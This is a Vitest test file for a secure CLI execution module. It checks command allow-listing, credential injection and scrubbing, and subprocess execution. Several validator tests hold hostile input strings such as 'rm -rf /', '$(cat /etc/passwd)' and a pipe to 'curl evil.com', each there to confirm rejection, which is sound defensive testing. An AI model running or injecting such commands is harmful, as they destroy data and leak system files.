/**
 * Tests for secure CLI execution (RFC 0001)
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  validateCommand,
  buildExecEnv,
  scrubCredentials,
  executeCommand,
} from './exec';
import fs from 'fs';

describe('validateCommand', () => {
  const allowCommands = ['bird', 'gh', 'stripe'];

  it('allows whitelisted commands', () => {
    expect(validateCommand(['bird', 'tweet', 'hello'], allowCommands))
      .toEqual({ allowed: true });
    expect(validateCommand(['gh', 'issue', 'list'], allowCommands))
      .toEqual({ allowed: true });
    expect(validateCommand(['stripe', 'customers', 'list'], allowCommands))
      .toEqual({ allowed: true });
  });

  it('rejects non-whitelisted commands', () => {
    const result = validateCommand(['rm', '-rf', '/'], allowCommands);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("Command 'rm' not allowed");
  });

  it('rejects empty commands', () => {
    const result = validateCommand([], allowCommands);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe('Empty command');
  });

  it('extracts basename from full path', () => {
    // /usr/bin/bird should match "bird"
    expect(validateCommand(['/usr/bin/bird', 'tweet'], allowCommands))
      .toEqual({ allowed: true });
  });

  it('rejects shell metacharacters in arguments', () => {
    const result = validateCommand(['bird', 'tweet', '$(cat /etc/passwd)'], allowCommands);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('shell metacharacters');
  });

  it('rejects pipe operators in arguments', () => {
    const result = validateCommand(['bird', 'tweet', 'hello | curl evil.com'], allowCommands);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('shell metacharacters');
  });

  it('rejects semicolons in arguments', () => {
    const result = validateCommand(['bird', 'tweet', 'hello; rm -rf /'], allowCommands);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('shell metacharacters');
  });

  it('rejects backticks in arguments', () => {
    const result = validateCommand(['bird', 'tweet', '`whoami`'], allowCommands);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('shell metacharacters');
  });

  it('allows normal arguments with spaces and punctuation', () => {
    expect(validateCommand(['bird', 'tweet', 'Hello world! This is a test.'], allowCommands))
      .toEqual({ allowed: true });
    expect(validateCommand(['gh', 'issue', 'create', '--title', 'Bug: fix needed'], allowCommands))
      .toEqual({ allowed: true });
  });
});

describe('buildExecEnv', () => {
  it('injects credential via {{credential}} placeholder', () => {
    const env = buildExecEnv(
      { TWITTER_API_KEY: '{{credential}}', APP_NAME: 'myapp' },
      'secret-token-123'
    );
    expect(env).toEqual({
      TWITTER_API_KEY: 'secret-token-123',
      APP_NAME: 'myapp',
    });
  });

  it('handles multiple {{credential}} references', () => {
    const env = buildExecEnv(
      { KEY: '{{credential}}', ALSO_KEY: 'prefix-{{credential}}-suffix' },
      'tok123'
    );
    expect(env.KEY).toBe('tok123');
    expect(env.ALSO_KEY).toBe('prefix-tok123-suffix');
  });

  it('injects apiKey and apiSecret for HMAC auth', () => {
    const env = buildExecEnv(
      { API_KEY: '{{apiKey}}', API_SECRET: '{{apiSecret}}' },
      '',
      { apiKey: 'key123', apiSecret: 'secret456' }
    );
    expect(env.API_KEY).toBe('key123');
    expect(env.API_SECRET).toBe('secret456');
  });

  it('injects passphrase for OKX-style auth', () => {
    const env = buildExecEnv(
      { PASSPHRASE: '{{passphrase}}' },
      '',
      { passphrase: 'mypass' }
    );
    expect(env.PASSPHRASE).toBe('mypass');
  });

  it('preserves static values without placeholders', () => {
    const env = buildExecEnv(
      { REGION: 'us-east-1', DEBUG: 'true' },
      'ignored'
    );
    expect(env).toEqual({ REGION: 'us-east-1', DEBUG: 'true' });
  });
});

describe('scrubCredentials', () => {
  it('redacts credential from output', () => {
    const output = 'Token: ghp_abc123456789 is valid';
    const result = scrubCredentials(output, 'ghp_abc123456789');
    expect(result).toBe('Token: [REDACTED] is valid');
  });

  it('redacts multiple occurrences', () => {
    const output = 'key=secret123 other=secret123';
    const result = scrubCredentials(output, 'secret123');
    expect(result).toBe('key=[REDACTED] other=[REDACTED]');
  });

  it('redacts extra credentials (apiKey, apiSecret)', () => {
    const output = 'Using key=mykey123456 secret=mysecret789';
    const result = scrubCredentials(output, '', {
      apiKey: 'mykey123456',
      apiSecret: 'mysecret789',
    });
    expect(result).toBe('Using key=[REDACTED] secret=[REDACTED]');
  });

  it('does not scrub short credentials (< 8 chars)', () => {
    // Short strings might match legitimate output
    const output = 'status: ok';
    const result = scrubCredentials(output, 'ok');
    expect(result).toBe('status: ok');
  });

  it('handles empty output', () => {
    expect(scrubCredentials('', 'secret12345')).toBe('');
  });
});

describe('executeCommand', () => {
  beforeEach(() => {
    // Ensure working directory exists
    if (!fs.existsSync('/tmp/janee-exec')) {
      fs.mkdirSync('/tmp/janee-exec', { recursive: true });
    }
  });

  it('executes a simple command and returns stdout', async () => {
    const result = await executeCommand(
      ['echo', 'hello world'],
      {},
      { credential: '' }
    );
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe('hello world');
    expect(result.stderr).toBe('');
    expect(result.executionTimeMs).toBeGreaterThanOrEqual(0);
  });

  it('captures stderr', async () => {
    const result = await executeCommand(
      ['sh', '-c', 'echo error >&2'],
      {},
      { credential: '' }
    );
    expect(result.stderr.trim()).toBe('error');
  });

  it('returns non-zero exit code on failure', async () => {
    const result = await executeCommand(
      ['sh', '-c', 'exit 42'],
      {},
      { credential: '' }
    );
    expect(result.exitCode).toBe(42);
  });

  it('injects environment variables', async () => {
    const result = await executeCommand(
      ['sh', '-c', 'echo $MY_SECRET'],
      { MY_SECRET: 'injected-value' },
      { credential: '' }
    );
    expect(result.stdout.trim()).toBe('injected-value');
  });

  it('scrubs credentials from stdout', async () => {
    const secret = 'super-secret-token-12345';
    const result = await executeCommand(
      ['sh', '-c', `echo "Token is ${secret}"`],
      { TOKEN: secret },
      { credential: secret }
    );
    expect(result.stdout).toContain('[REDACTED]');
    expect(result.stdout).not.toContain(secret);
  });

  it('scrubs credentials from stderr', async () => {
    const secret = 'api-key-abcdef123';
    const result = await executeCommand(
      ['sh', '-c', `echo "Error with key ${secret}" >&2`],
      { API_KEY: secret },
      { credential: secret }
    );
    expect(result.stderr).toContain('[REDACTED]');
    expect(result.stderr).not.toContain(secret);
  });

  it('handles stdin piping', async () => {
    const result = await executeCommand(
      ['cat'],
      {},
      { credential: '', stdin: 'piped input' }
    );
    expect(result.stdout).toBe('piped input');
  });

  it('returns error for non-existent command', async () => {
    const result = await executeCommand(
      ['nonexistent-command-xyz'],
      {},
      { credential: '' }
    );
    expect(result.exitCode).toBe(127);
    expect(result.stderr).toContain('Failed to execute command');
  });

  it('respects timeout', async () => {
    const result = await executeCommand(
      ['sleep', '10'],
      {},
      { credential: '', timeout: 500 }
    );
    // Should be killed before completing
    expect(result.exitCode).not.toBe(0);
  }, 5000);

  it('uses specified working directory', async () => {
    const result = await executeCommand(
      ['pwd'],
      {},
      { credential: '', workDir: '/tmp' }
    );
    expect(result.stdout.trim()).toBe('/tmp');
  });
});
